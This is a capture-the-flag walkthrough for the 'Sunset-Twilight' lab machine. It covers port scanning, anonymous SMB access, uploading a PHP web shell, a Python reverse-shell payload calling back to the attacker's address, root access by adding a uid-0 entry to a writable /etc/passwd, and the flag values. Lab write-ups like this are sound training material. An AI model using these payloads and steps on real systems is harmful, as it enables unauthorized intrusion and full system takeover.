# Sunset-Twilight

Lets check the IP address ➡️

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled.png)

```bash
IP : 10.0.2.45
```

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Twilight]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.45
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 13:40 IST
Nmap scan report for 10.0.2.45
Host is up (0.0025s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 43e945ecf45bede96447434339969dc9 (RSA)
|   256 ed67ad310417efcf750205db889497a0 (ECDSA)
|_  256 ed41e5d1b2232cd590592a378bda31c1 (ED25519)
25/tcp    open  smtp        Exim smtpd 4.92
| smtp-commands: twilight Hello nmap.scanme.org [10.0.2.27], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp    open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
2121/tcp  open  ftp         pyftpdlib 1.5.6
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.0.2.45:2121
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root           35 Jul 16  2020 22253251-65325.twilight
3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 39
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, Support41Auth, ConnectWithDatabase, SupportsTransactions, FoundRows, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, SupportsLoadDataLocal, Speaks41ProtocolNew, ODBCClient, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 9}/mZY0%fSOod%,L{G1]
|_  Auth Plugin Name: mysql_native_password
8080/tcp  open  http        PHP cli server 5.5 or later
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Login - powered by Easy File Sharing Web Server
63525/tcp open  http        PHP cli server 5.5 or later
|_http-title: Login - powered by Easy File Sharing Web Server
MAC Address: 08:00:27:54:08:C8 (Oracle VirtualBox virtual NIC)
Service Info: Host: twilight; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%201.png)

Now I also found smb services lets enumerate it also →

## SMB Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%202.png)

Now I have a directory to Recon further `WRKSHARE` Lets try for smb shell →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Twilight]
└─$ smbclient -N //10.0.2.45/WRKSHARE/
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 04:27:09 2020
  ..                                  D        0  Thu Jul  9 04:27:09 2020
  root                                D        0  Thu Jul 16 19:20:46 2020
  run                                 D        0  Thu May  4 13:40:22 2023
  lost+found                          D        0  Thu Jul  9 03:38:46 2020
  initrd.img                          N 25814661  Thu Jul  9 04:28:16 2020
  etc                                 D        0  Thu May  4 13:40:13 2023
  proc                                D        0  Thu May  4 13:40:17 2023
  vmlinuz                             N  5274864  Sun Jun  7 21:12:22 2020
  initrd.img.old                      N 25807574  Thu Jul  9 04:28:02 2020
  opt                                 D        0  Thu Jul  9 03:39:01 2020
  srv                                 D        0  Thu Jul  9 03:39:01 2020
  sys                                 D        0  Thu May  4 13:40:05 2023
  lib64                               D        0  Thu Jul  9 03:39:08 2020
  sbin                                D        0  Thu Jul 16 19:23:39 2020
  media                               D        0  Thu Jul  9 03:38:46 2020
  bin                                 D        0  Thu Jul 16 17:52:20 2020
  usr                                 D        0  Thu Jul  9 03:39:01 2020
  lib32                               D        0  Thu Jul  9 03:38:56 2020
  dev                                 D        0  Thu May  4 13:40:11 2023
  lib                                 D        0  Thu Jul  9 07:50:29 2020
  vmlinuz.old                         N  5274864  Mon Apr 27 10:35:39 2020
  libx32                              D        0  Thu Jul  9 03:38:56 2020
  home                                D        0  Thu Jul  9 04:45:56 2020
  mnt                                 D        0  Thu Jul  9 03:39:01 2020
  var                                 D        0  Thu Jul  9 05:33:27 2020
  boot                                D        0  Thu Jul  9 04:36:53 2020
  tmp                                 D        0  Thu May  4 13:40:22 2023

		7158264 blocks of size 1024. 4369328 blocks available
```

I got whole root directory of victim machine so It good for me lets upload a reverse shell in `/var/www/html/` location →

```bash
smb: \var\www\html\> put cmd.php
putting file cmd.php as \var\www\html\cmd.php (4.3 kb/s) (average 119.6 kb/s)
```

cmd.php content →

```bash
<?php
system($_GET['cmd']);
?>
```

In response to that I got this →

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%203.png)

So lets run our python payload for reverse shell →

```bash
http://10.0.2.45/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.27%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
```

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%204.png)

Now I tried finding SUIDs and GUISs but no luck then I got this →

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%205.png)

Now I can add a user in this file and run as root →

First we need to choose a password, salt it and hash the result. openssl to the rescue.

Flags:

- -`1` what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.
- -`salt salt` string to use as salt. I choose the string salt
- `password` clear text password we would like to use.

```bash
$ openssl passwd -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```

we need to add some data in order for it to be aligned with the `/etc/passwd` format. This is the final result:

```bash
shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
```

I named the user `shiv`. now lets write into the `/etc/passwd` file with nano →

![Untitled](/Vulnhub-Files/img/Sunset-Twilight/Untitled%206.png)

```bash
www-data@twilight:/$ su shiv
Password: 
root@twilight:/# whoami
root
root@twilight:/#
root@twilight:/# cd /root
root@twilight:~# ls
root.txt
root@twilight:~# cat root.txt
(\ 
\'\ 
 \'\     __________  
 / '|   ()_________)
 \ '/    \ ~~~~~~~~ \
   \       \ ~~~~~~   \
   ==).      \__________\
  (__)       ()__________)

34d3ecb1bbd092bcb87954cee55d88d3

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
root@twilight:~#
```

Now I am the boss root —> lets see the user.txt file now ➡️

```bash
root@twilight:/home/miguel# cat user.txt 
6b963e69f7b4a6205513973e4cace702
root@twilight:/home/miguel#
```